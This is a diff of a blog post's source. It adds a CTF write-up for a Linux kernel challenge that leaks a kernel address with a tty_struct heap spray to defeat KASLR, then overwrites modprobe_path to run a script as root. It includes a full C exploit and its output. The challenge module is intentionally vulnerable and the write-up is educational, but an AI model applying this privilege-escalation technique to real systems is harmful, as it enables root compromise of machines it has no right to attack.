@@ -1,13 +1,12 @@
 +++
 title = "Upsolving two pwn challenges from last year"
-date = "2026-02-02T00:57:12+08:00"
+date = "2026-02-02T16:51:12+08:00"
 author = "azazo"
 description = "my new years resolution is get better at pwn"
 tags = ["ctf", "writeup"]
 showFullContent = false
 readingTime = false
 hideComments = false
-draft = true
 +++
 
 # Introduction
@@ -369,9 +368,153 @@ As mentioned before, in kernel challenges our goal is usually to achieve privile
 - calling `commit_creds(prepare_kernel_cred(&init_task))`
 - overwriting `modprobe_path`
 
-While the former technique seems to be more versatile, the latter is simpler and can be done with one single arbitrary write. 
+While the former technique seems to be more versatile, the latter is simpler and can be done with one single arbitrary write, so that is what we are going to use here.
+
+Simply put, `modprobe_path` is a path that points to a binary to be ran whenever some binary with unknown format is executed (if the first 4 bytes are non-printable characters). The default value for `modprobe_path` is `/sbin/modprobe`. Importantly, the binary is ran with root privilege, and `modprobe_path` is not `const`, so by overwriting it we can execute arbitrary binaries as root whenever we run a malformed binary.
+
+Now, of course, to overwrite it with our arbitrary write we first need to know its address. The `/proc/kallsyms` file contains the symbol table from the Linux kernel, so we can just look through it to find the address and win, right? Not so fast.
+
+Unfortunately, KASLR is enabled in this challenge. This means that the address of `modprobe_path` is randomised; while its upper 4 bytes and lower 5 nibbles will remain the same, the remaining 3 nibbles are random. So we cannot just read the address from `/proc/kallsyms` and hardcode it into our exploit binary. We also cannot dynamically enter the address, since to read `/proc/kallsyms` we need to be root anyways.
 
 ## Taking care of KASLR
+
+In Elma's writeup, he leveraged the fact that his arbitrary read is fail-safe and that KASLR only has 12 bits of entropy, to brute force the kernel base address. I'm not too sure if this method will work here, since `copy_to_iter` is being used, but either ways I think that brute forcing is not a very fun technique.
+
+Instead, a much better method is to spray the heap: allocate a bunch of chunks that will have useful information, then read from a predetermined address hoping that a chunk has been allocated there. But before continuing, it would be wise to talk about the kernel memory allocator first.
+
+The allocator used by the Linux kernel is called the SLUB allocator, and is distinctively different from the glibc allocator. Here is what pawnyable.cafe says about it, translated into English by yours truly:
+
+> The SLUB allocator is currently the default allocator used, being designed for large scale systems and engineered to be as efficient as possible. Its main implementation is defined in [/mm/slub.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slub.c).
+> The SLUB allocator has the following characteristics:
+> - **Page frames used are differentiated according to allocation size.** As with SLAB, the page frame used for allocation differs depending on the requested size. Dedicated regions of memory are used for each size, so for example requests of 100 bytes are allocated in `kmalloc-128`, and requests of 200 bytes are allocated in `kmalloc-256`. Unlike the SLAB allocator, no metadata (such as indices of freed chunks or pointer to the head of the freelist) is stored at the beginning of the page frame; instead, they are stored in the page frame descriptor.
+> - **Freed chunks are managed with a singly linked list.** Like the tcache or fastbins of the glibc allocator, a pointer to the previously freed chunk is written to the start of a newly freed chunk, with the oldest freed chunk having NULL. However, unlike the tcache or fastbins, there are no particular mechanisms that check for overwriting/tampering of these pointers.
+> - **Use of a cache.** As with the SLAB allocator, a cache of freed chunks is maintained for each of the smaller allocations as a singly linked list.
+>
+> The diagram below shows the freed chunks being managed by singly linked lists:
+> {{< image src="/images/upsolve-pwn/slub_allocator_english.png" position="center">}}
+
+Most important to us is the first point: our `checksum_buffer` struct has a size of 544 bytes, so it will get allocated into `kmalloc-1024`.
+
+From [this website](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628) with information on helpful kernel structures, a suitable struct to use is then `tty_struct`: it has size 0x2e0 so is also allocated in `kmalloc-1024`, and contains the field `ops` which points to the symbol `ptm_unix98_ops`. The offsets on the website aren't accurate since this challenge uses v6.10.10 of the Linux kernel, but through looking in GDB we can determine the correct offset for `ops`.
+
+As the website points out, we can make the kernel allocate a `tty_struct` by opening `/dev/ptmx`. So, if we do that for some large enough amount before and after we open our `/dev/checksumz` module, we can say with relative confidence that a `tty_struct` will be directly after our `checksum_buffer` in memory. Then, we can read the address of `ptm_unix98_ops` by reading from index 1024 (size of chunk) - 8 (one `loff_t` before the start of `state`) + 32 (offset of `ops` within `tty_struct`) = 1048 of `state`.
+
+After we obtain the address of `ptm_unix98_ops`, we can calculate the address of `modprobe_path` since it will be located at a fixed offset away, then overwrite it with the path to our own script. Since our goal is to read the flag in `/dev/vda`, we can make our script do `chmod 777 /dev/vda` to give us the permissions to read the file directly from the command line. Finally, we create a malformed binary and run it to get the kernel to execute our script.
+
+My solve script, with some comments, is:
+```c
+#include "api.h"
+#include <stdio.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <stdlib.h>
+
+#define SPRAY 500
+
+int fd;
+
+int a = sizeof(struct checksum_buffer);
+
+int main() {
+    // spray
+    int spray[SPRAY];
+    for (int i = 0; i < SPRAY/2; ++i) {
+        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+        if (spray[i] == -1) perror("/dev/ptmx");
+    }
+
+    fd = open("/dev/checksumz", O_RDWR);
+    if (fd < 0) perror("/dev/checksumz");
+    puts("[*] Opened device");
+
+    // spray part 2
+    for (int i = SPRAY/2; i < SPRAY; ++i) {
+        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+        if (spray[i] == -1) perror("/dev/ptmx");
+    }
+
+    int m;
+
+    // overflow into buffer->size
+    m = lseek(fd, 511, SEEK_SET);
+    printf("seek to %d\n", m);
+    m = write(fd, "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff", 16);
+    if (m < 0) perror("write");
+
+    // by overwriting buffer->name we can do arbwrite
+    // so we can try overwriting modprobe_path
+
+    // now we assume  that we have a tty_struct after our struct
+    // so buffer - 8 + 0x400 should be its address
+    // anyways lets just look for our leak
+    for (int i = 0; i < 0x28; i += 8) {
+        m = lseek(fd, 0x400 - 8 + i, SEEK_SET);
+        long meow;
+        m = read(fd, &meow, sizeof(meow));
+        printf("[*] &tty_struct+0x%02x is %lx\n", i, meow);
+    }
+    
+    // 0x0020 is ffffffff82289480
+    // ~ # cat /proc/kallsyms | grep ffffffff82289480
+    // ffffffff82289480 d ptm_unix98_ops
+    // yay yay yippee!
+    // ~ # cat /proc/kallsyms | grep modprobe_path
+    // ffffffff82b3f100 D modprobe_path
+
+    long modprobe_path_addr;
+    lseek(fd, 0x400 - 8 + 0x20, SEEK_SET);
+    m = read(fd, &modprobe_path_addr, sizeof(modprobe_path_addr));
+    modprobe_path_addr += 0xffffffff82b3f100LL;
+    modprobe_path_addr -= 0xffffffff82289480LL;
+    printf("modprobe_path is at %lx\n", modprobe_path_addr);
+
+    // change modprobe_path to point to /tmp/meow
+    lseek(fd, 512 + 8 + 8, SEEK_SET);
+    m = write(fd, &modprobe_path_addr, 8);
+    if (m < 0) perror("write");
+    m = ioctl(fd, CHECKSUMZ_IOCTL_RENAME, "/tmp/meow\x00");
+    if (m < 0) perror("rename");
+
+    // make /tmp/meow do chmod 777 /dev/vda so we can read the flag
+    // then create and execute malformed binary to run /tmp/meow as root
+    system("echo -e '#!/bin/sh\nchmod 777 /dev/vda' > /tmp/meow");
+    system("chmod +x /tmp/meow");
+    system("echo -e '\xff\xff\xff\xff' > /tmp/rawr");
+    system("chmod +x /tmp/rawr");
+    system("/tmp/rawr");
+    return 0;
+}
+```
+
+Ok, now we just need to get this into QEMU so we can run the program. When upsolving this, I compiled the exploit program statically then served it with `python -m http.server`, but one could also do something like base64 encode the program then decode it in the virtual machine. We first find the default gateway using `ip route`, then `wget`, `chmod` and run our exploit:
+```bash
+~ $ ip route
+default via 10.0.2.2 dev eth0
+10.0.2.0/24 dev eth0 scope link  src 10.0.2.15
+~ $ wget http://10.0.2.2:8080/exploit && chmod +x exploit && ./exploit
+Connecting to 10.0.2.2:8080 (10.0.2.2:8080)
+saving to 'exploit'
+exploit              100% |********************************|  893k  0:00:00 ETA
+'exploit' saved
+[*] Opened device
+seek to 511
+[*] &tty_struct+0x00 is fa00000001
+[*] &tty_struct+0x08 is 0
+[*] &tty_struct+0x10 is ff1bf55bc195af00
+[*] &tty_struct+0x18 is ff1bf55bc2803c00
+[*] &tty_struct+0x20 is ffffffffa1489480
+modprobe_path is at ffffffffa1d3f100
+/tmp/rawr: line 1: ����: not found
+```
+
+The last line shows that our malformed binary was ran successfully. Now, `/dev/vda` should be readable by us, so we can simply `cat` it to get the flag!
+```bash
+~ $ cat /dev/vda
+irisctf{fakeflag}
+```
 
 # ICO 2025 - studystudystudy
 
@@ -723,7 +866,7 @@ For some reason, this doesn't always work and hangs at some of the `p.sendlineaf
 
 # Conclusion
 
-Fun fact: I started writing this on 6th January, but gave up pretty early into the writing because I didn't feel comfortable doing a writeup for challenges this easy. Of course, to me at the time these challenges seemed difficult, but now with more experience (and friends that do pwn) I can quite confidently say that these are on the easier side; in fact it even felt a bit shameful and performative to write writeups for them. But unfortunately compulsory military conscription is a thing in my country, so I wanted to finish this before being gone for a while, and I think sometimes it's good to just write things without thinking too much about how they will be perceived.
+Fun fact: I started writing this on 6th January, but gave up pretty early into the writing because I didn't feel comfortable doing a writeup for challenges this easy. Of course, to me at the time these challenges seemed difficult, but now with more experience (and friends that do pwn) I can quite confidently say that these are on the easier side; in fact it even felt a bit shameful and performative to write writeups for them when you could probably explain the solution in one sentence. But unfortunately compulsory military conscription is a thing in my country, so I wanted to finish this before being gone for a while, and I think sometimes it's good to just write things without thinking too much about how they will be perceived.
 
 Regardless, I hope you enjoyed reading this and/or learned something. See you (hopefully) soon.
 
